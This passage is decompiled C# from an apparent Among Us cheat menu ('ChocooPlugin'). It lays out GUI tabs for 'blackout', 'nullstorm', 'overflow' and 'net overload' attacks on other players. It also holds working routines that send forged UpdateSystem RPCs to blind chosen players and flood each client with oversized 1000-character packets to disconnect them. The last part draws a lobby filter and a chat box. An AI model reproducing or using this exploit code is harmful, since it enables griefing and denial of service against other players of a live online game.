      GUI.backgroundColor = ChocooPlugin.OverflowMethod6Enabled ? new Color(1f, 0.5f, 0.0f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverflowMethod6Enabled ? "STOP OVERFLOW " : "OVERFLOW [METHOD 6]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverflowMethod6Enabled = !ChocooPlugin.OverflowMethod6Enabled;
        if (ChocooPlugin.OverflowMethod6Enabled)
        {
          ChocooPlugin.OverflowMethod1Enabled = false;
          ChocooPlugin.OverflowMethod2Enabled = false;
          ChocooPlugin.OverflowMethod3Enabled = false;
          ChocooPlugin.OverflowMethod4Enabled = false;
          ChocooPlugin.OverflowMethod5Enabled = false;
        }
      }
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverflowMethod7Enabled ? new Color(1f, 0.5f, 0.0f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverflowMethod7Enabled ? "STOP OVERFLOW " : "OVERFLOW [METHOD 7]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverflowMethod7Enabled = !ChocooPlugin.OverflowMethod7Enabled;
        if (ChocooPlugin.OverflowMethod7Enabled)
        {
          ChocooPlugin.OverflowMethod1Enabled = false;
          ChocooPlugin.OverflowMethod2Enabled = false;
          ChocooPlugin.OverflowMethod3Enabled = false;
          ChocooPlugin.OverflowMethod4Enabled = false;
          ChocooPlugin.OverflowMethod5Enabled = false;
          ChocooPlugin.OverflowMethod6Enabled = false;
        }
      }
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverflowMethod8Enabled ? new Color(1f, 0.5f, 0.0f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverflowMethod8Enabled ? "STOP OVERFLOW " : "OVERFLOW [METHOD 8]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.OverflowMethod8Enabled = !ChocooPlugin.OverflowMethod8Enabled;
        if (ChocooPlugin.OverflowMethod8Enabled)
        {
          ChocooPlugin.OverflowMethod1Enabled = false;
          ChocooPlugin.OverflowMethod2Enabled = false;
          ChocooPlugin.OverflowMethod3Enabled = false;
          ChocooPlugin.OverflowMethod4Enabled = false;
          ChocooPlugin.OverflowMethod5Enabled = false;
          ChocooPlugin.OverflowMethod6Enabled = false;
          ChocooPlugin.OverflowMethod7Enabled = false;
        }
      }
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = new Color(0.3f, 0.7f, 1f);
      GUILayout.Label("Overflow Info", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.gray;
      GUILayout.Label("OVERFLOW (Block Data):", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 1: Blocks multiple RPCs", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 2: Blocks name only", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 3: Lobby timer overflow", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 4: Corrupts all player NetIds", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 5: Nulls physics body of all players", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 6: Nulls cosmetics of all players", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 7: Wipes player list, injects fakes", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 8: Zeroes all InnerNetObject NetIds", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Usage: Enable before joining lobby", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
    }

    private void DrawBlackoutSection()
    {
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : Color.red;
      GUILayout.Label("⚫ BLACKOUT ATTACKS", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 12,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      if (GUILayout.Button("⚫ BLACKOUT [METHOD 1]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
        this.BlackoutAllWithoutHost();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(10f);
      GUI.contentColor = Color.yellow;
      GUILayout.Label("Target Specific Player", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      this.destroyPlayerScrollPosition = GUILayout.BeginScrollView(this.destroyPlayerScrollPosition, new GUILayoutOption[1]
      {
        GUILayout.Height(200f)
      });
      foreach (PlayerControl cachedPlayer in this._cachedPlayers)
      {
        if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && (int) cachedPlayer.PlayerId != (int) PlayerControl.LocalPlayer.PlayerId)
        {
          string str = cachedPlayer.Data?.PlayerName ?? "Unknown";
          GUI.backgroundColor = ChocooPlugin.selectedTargetId == ((InnerNetObject) cachedPlayer).OwnerId ? new Color(1f, 0.8f, 0.0f, 0.5f) : ChocooPlugin.GetRGBAccent();
          if (GUILayout.Button(str, new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
            ChocooPlugin.selectedTargetId = ((InnerNetObject) cachedPlayer).OwnerId;
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        }
      }
      GUILayout.EndScrollView();
      GUILayout.Space(10f);
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      GUI.enabled = ChocooPlugin.selectedTargetId != -1;
      if (GUILayout.Button("⚫ GUIDED BLACKOUT", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.BlackoutTargetWithoutHost();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
    }

    private void DrawNullstormSection()
    {
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.5f, 0.0f);
      GUILayout.Label("⚡ NULLSTORM ATTACKS", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 12,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      if (GUILayout.Button("ACTIVATE NULLSTORM", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
        this.NetOverflowMethod1();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = new Color(1f, 0.5f, 0.0f);
      GUILayout.Label("Nullstorm Info", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.gray;
      GUILayout.Label("NULLSTORM:", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Destabilizes connections", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Disconnects Everyone", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Use with caution", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
    }

    private void DrawNetOverloadSection()
    {
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.2f, 0.8f, 0.4f);
      GUILayout.Label("\uD83C\uDF10 NET OVERLOAD ATTACKS", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 12,
        alignment = (TextAnchor) 4
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.OverloadMethod3Enabled ? new Color(1f, 0.3f, 0.3f, 0.3f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.OverloadMethod3Enabled ? "STOP OVERLOAD" : "NET OVERLOAD ALL [METHOD 1]", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
        ChocooPlugin.OverloadMethod3Enabled = !ChocooPlugin.OverloadMethod3Enabled;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(10f);
      GUI.contentColor = Color.yellow;
      GUILayout.Label("Target Specific Player", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.targetedOverloadMethod == 3 ? new Color(0.5f, 0.2f, 0.9f, 0.5f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button("NetOverload 1", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        ChocooPlugin.targetedOverloadMethod = 3;
      GUI.backgroundColor = ChocooPlugin.targetedOverloadMethod == 5 ? new Color(0.5f, 0.2f, 0.9f, 0.5f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button("NetOverload 2", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        ChocooPlugin.targetedOverloadMethod = 5;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      this.destroyPlayerScrollPosition = GUILayout.BeginScrollView(this.destroyPlayerScrollPosition, new GUILayoutOption[1]
      {
        GUILayout.Height(100f)
      });
      foreach (PlayerControl cachedPlayer in this._cachedPlayers)
      {
        if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && (int) cachedPlayer.PlayerId != (int) PlayerControl.LocalPlayer.PlayerId)
        {
          string str = cachedPlayer.Data?.PlayerName ?? "Unknown";
          GUI.backgroundColor = ChocooPlugin.selectedTargetId == ((InnerNetObject) cachedPlayer).OwnerId ? new Color(1f, 0.8f, 0.0f, 0.5f) : ChocooPlugin.GetRGBAccent();
          if (GUILayout.Button(str, new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
            ChocooPlugin.selectedTargetId = ((InnerNetObject) cachedPlayer).OwnerId;
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        }
      }
      GUILayout.EndScrollView();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.TargetedOverloadEnabled ? new Color(0.5f, 0.2f, 0.9f, 0.5f) : ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(ChocooPlugin.TargetedOverloadEnabled ? "STOP OVERLOAD TARGET" : "OVERLOAD TARGET", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
      {
        ChocooPlugin.TargetedOverloadEnabled = !ChocooPlugin.TargetedOverloadEnabled;
        if (!ChocooPlugin.TargetedOverloadEnabled)
        {
          ChocooPlugin.lastMethod3OverloadTime = 0.0f;
          ChocooPlugin.ChocooMenu.lastTargetedMixMethod3Time = 0.0f;
        }
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = new Color(0.2f, 0.8f, 0.4f);
      GUILayout.Label("NetOverload Info", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.gray;
      GUILayout.Label("• Method 1: PlayAnimation & Data", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Method 2: Invalid Net Id & Mix", new GUIStyle(GUI.skin.label)
      {
        fontSize = 9
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
    }

    private void BlackoutAllWithoutHost()
    {
      try
      {
        if (Object.op_Equality((Object) ShipStatus.Instance, (Object) null))
        {
          ChocooPlugin.Logger.LogWarning((object) "Game must be started for blackout");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Game must start to blackout players");
        }
        else
        {
          int num = 0;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (!Object.op_Equality((Object) cachedPlayer, (Object) null) && !Object.op_Equality((Object) cachedPlayer.Data, (Object) null) && !cachedPlayer.Data.Disconnected && (int) cachedPlayer.PlayerId != (int) PlayerControl.LocalPlayer.PlayerId)
            {
              bool flag = false;
              try
              {
                if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null))
                {
                  ClientData client = ((InnerNetClient) AmongUsClient.Instance).GetClient(cachedPlayer.Data.ClientId);
                  if (client != null && client.Id == ((InnerNetClient) AmongUsClient.Instance).HostId)
                    flag = true;
                }
              }
              catch
              {
              }
              if (!flag)
              {
                int ownerId = ((InnerNetObject) cachedPlayer).OwnerId;
                string key = cachedPlayer.Data.PlayerName ?? "Unknown";
                ChocooPlugin.blackoutedPlayers.Add(key);
                ChocooPlugin.blackoutTimestamps[key] = Time.time;
                ChocooPlugin.Logger.LogInfo((object) $"Blacking out {key} via ventilation exploit");
                MessageWriter secondWriter1 = MessageWriter.Get((SendOption) 1);
                secondWriter1.Write((ushort) 0);
                secondWriter1.Write((byte) 2);
                secondWriter1.Write((byte) 0);
                this.SendUpdateSystemToPlayer((SystemTypes) 37, secondWriter1, ownerId);
                secondWriter1.Recycle();
                MessageWriter secondWriter2 = MessageWriter.Get((SendOption) 1);
                secondWriter2.Write((ushort) 1);
                secondWriter2.Write((byte) 5);
                secondWriter2.Write((byte) 0);
                this.SendUpdateSystemToPlayer((SystemTypes) 37, secondWriter2, ownerId);
                secondWriter2.Recycle();
                ++num;
              }
            }
          }
          ChocooPlugin.Logger.LogInfo((object) $"✓ Blacked out {num.ToString()} players without host");
          if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
            return;
          DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage($"Blacked out {num.ToString()} players!");
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Blackout all without host error: " + ex.Message));
        ChocooPlugin.Logger.LogError((object) ("Stack trace: " + ex.StackTrace));
      }
    }

    private void BlackoutTargetWithoutHost()
    {
      try
      {
        if (ChocooPlugin.selectedTargetId == -1)
        {
          ChocooPlugin.Logger.LogWarning((object) "No player selected for blackout");
        }
        else
        {
          PlayerControl playerControl = (PlayerControl) null;
          foreach (PlayerControl cachedPlayer in this._cachedPlayers)
          {
            if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && ((InnerNetObject) cachedPlayer).OwnerId == ChocooPlugin.selectedTargetId)
            {
              playerControl = cachedPlayer;
              break;
            }
          }
          if (Object.op_Equality((Object) playerControl, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "Target player not found");
            if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
              return;
            DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Player not found!");
          }
          else
          {
            string key = playerControl.Data.PlayerName ?? "Unknown";
            bool flag = false;
            try
            {
              if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null))
              {
                ClientData client = ((InnerNetClient) AmongUsClient.Instance).GetClient(playerControl.Data.ClientId);
                if (client != null && client.Id == ((InnerNetClient) AmongUsClient.Instance).HostId)
                  flag = true;
              }
            }
            catch
            {
            }
            if (flag)
            {
              ChocooPlugin.Logger.LogWarning((object) "Cannot blackout host with this method");
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Cannot ban host, skill issue :-(");
            }
            else if (Object.op_Equality((Object) ShipStatus.Instance, (Object) null))
            {
              ChocooPlugin.Logger.LogWarning((object) "Game must be started for blackout");
              if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
                return;
              DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Game must start to blackout players");
            }
            else
            {
              int ownerId = ((InnerNetObject) playerControl).OwnerId;
              ChocooPlugin.blackoutedPlayers.Add(key);
              ChocooPlugin.blackoutTimestamps[key] = Time.time;
              ChocooPlugin.Logger.LogInfo((object) ("Attempting ventilation blackout on " + key));
              ChocooPlugin.Logger.LogInfo((object) ("Target OwnerId: " + ownerId.ToString()));
              MessageWriter secondWriter1 = MessageWriter.Get((SendOption) 1);
              secondWriter1.Write((ushort) 0);
              secondWriter1.Write((byte) 2);
              secondWriter1.Write((byte) 0);
              this.SendUpdateSystemToPlayer((SystemTypes) 37, secondWriter1, ownerId);
              secondWriter1.Recycle();
              ChocooPlugin.Logger.LogInfo((object) ("Sent EnterVent to " + key));
              MessageWriter secondWriter2 = MessageWriter.Get((SendOption) 1);
              secondWriter2.Write((ushort) 1);
              secondWriter2.Write((byte) 5);
              secondWriter2.Write((byte) 0);
              this.SendUpdateSystemToPlayer((SystemTypes) 37, secondWriter2, ownerId);
              secondWriter2.Recycle();
              ChocooPlugin.Logger.LogInfo((object) ("Sent Blackout to " + key));
              ChocooPlugin.Logger.LogInfo((object) ("✓ blackout completed for " + key));
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Blackout target without host error: " + ex.Message));
        ChocooPlugin.Logger.LogError((object) ("Stack trace: " + ex.StackTrace));
        if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
          return;
        DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("Blackout failed! Check logs.");
      }
    }

    private void NetOverflowMethod1()
    {
      try
      {
        int num = 0;
        foreach (PlayerControl cachedPlayer in this._cachedPlayers)
        {
          if (!Object.op_Equality((Object) cachedPlayer, (Object) null) && !Object.op_Equality((Object) cachedPlayer.Data, (Object) null) && !cachedPlayer.Data.Disconnected && (int) cachedPlayer.PlayerId != (int) PlayerControl.LocalPlayer.PlayerId)
          {
            string key = cachedPlayer.Data.PlayerName ?? "Unknown";
            ChocooPlugin.blackoutedPlayers.Add(key);
            ChocooPlugin.blackoutTimestamps[key] = Time.time;
            this.ExecuteChatOverflow(cachedPlayer);
            ++num;
          }
        }
        if (!Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance, (Object) null) || !Object.op_Inequality((Object) DestroyableSingleton<HudManager>.Instance.Notifier, (Object) null))
          return;
        DestroyableSingleton<HudManager>.Instance.Notifier.AddDisconnectMessage("<color=#A020F0>[NULLSTORM]</color> Destabilizing Connections");
      }
      catch (Exception ex)
      {
      }
    }

    private void ExecuteChatOverflow(PlayerControl target)
    {
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || Object.op_Equality((Object) target, (Object) null))
          return;
        for (int index = 0; index < 50; ++index)
        {
          try
          {
            MessageWriter messageWriter = MessageWriter.Get((SendOption) 1);
            messageWriter.StartMessage((byte) 6);
            messageWriter.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
            messageWriter.WritePacked(((InnerNetObject) target).OwnerId);
            messageWriter.StartMessage((byte) 2);
            messageWriter.WritePacked(((InnerNetObject) target).NetId);
            messageWriter.Write((byte) 13);
            string str = new string('A', 1000) + index.ToString();
            messageWriter.Write(str);
            messageWriter.EndMessage();
            messageWriter.EndMessage();
            ((InnerNetClient) AmongUsClient.Instance).SendOrDisconnect(messageWriter);
            messageWriter.Recycle();
          }
          catch
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void SendUpdateSystemToPlayer(
      SystemTypes system,
      MessageWriter secondWriter,
      int target)
    {
      try
      {
        if (Object.op_Equality((Object) ShipStatus.Instance, (Object) null))
        {
          ChocooPlugin.Logger.LogWarning((object) "ShipStatus.Instance is null");
        }
        else
        {
          InnerNetClient instance = (InnerNetClient) AmongUsClient.Instance;
          if (Object.op_Equality((Object) instance, (Object) null))
          {
            ChocooPlugin.Logger.LogWarning((object) "AmongUsClient.Instance is null");
          }
          else
          {
            MessageWriter messageWriter = instance.StartRpcImmediately(((InnerNetObject) ShipStatus.Instance).NetId, (byte) 35, (SendOption) 1, target);
            messageWriter.Write((byte) system);
            MessageExtensions.WriteNetObject(messageWriter, (InnerNetObject) PlayerControl.LocalPlayer);
            messageWriter.Write(secondWriter, false);
            instance.FinishRpcImmediately(messageWriter);
            ChocooPlugin.Logger.LogInfo((object) ("Sent UpdateSystem RPC to client " + target.ToString()));
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("SendUpdateSystemToPlayer error: " + ex.Message));
      }
    }

    private void DrawNoDatingTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.3f, 0.5f);
      GUILayout.Label("No Dating Tools", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.DrawToggleSwitch("Find Daters Lobby", ref ChocooPlugin.FindDatersEnabled);
      if (ChocooPlugin.FindDatersEnabled)
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.green;
        GUILayout.Label("✓ Advanced Search Active", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.gray;
        GUILayout.Label("Filtering: 1 impostor, 4-9 players, free chat", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.Space(10f);
      this.DrawToggleSwitch("Extended Lobby List", ref ChocooPlugin.ExtendedLobbyEnabled);
      if (ChocooPlugin.ExtendedLobbyEnabled)
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.green;
        GUILayout.Label("✓ Extended List Active", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.gray;
        GUILayout.Label("Showing 20+ lobbies with scroll", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.Space(15f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.3f, 0.5f);
      GUILayout.Label("No Dating Info", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.gray;
      GUILayout.Label("• Find Daters: Apply search filters", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Extended List: Show 20+ lobbies", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
    }

    private void DrawChatTab()
    {
      bool flag1 = Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost;
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.3f, 1f, 0.3f);
      GUILayout.Label("Manual Chat", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.chatScrollPosition = GUILayout.BeginScrollView(this.chatScrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, Array.Empty<GUILayoutOption>());
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 1f, 0.5f);
      GUILayout.Label("Type your message:", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 11
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      Rect rect1 = GUILayoutUtility.GetRect(GUIContent.none, GUI.skin.box, new GUILayoutOption[2]
      {
        GUILayout.Height(100f),
        GUILayout.ExpandWidth(true)
      });
      GUI.Box(rect1, "", GUI.skin.box);
      if (GUI.Button(rect1, "", GUIStyle.none))
        this.chatBoxFocused = true;
      Rect rect2;
      // ISSUE: explicit constructor call
      ((Rect) ref rect2).\u002Ector(((Rect) ref rect1).x + 5f, ((Rect) ref rect1).y + 5f, ((Rect) ref rect1).width - 10f, ((Rect) ref rect1).height - 10f);
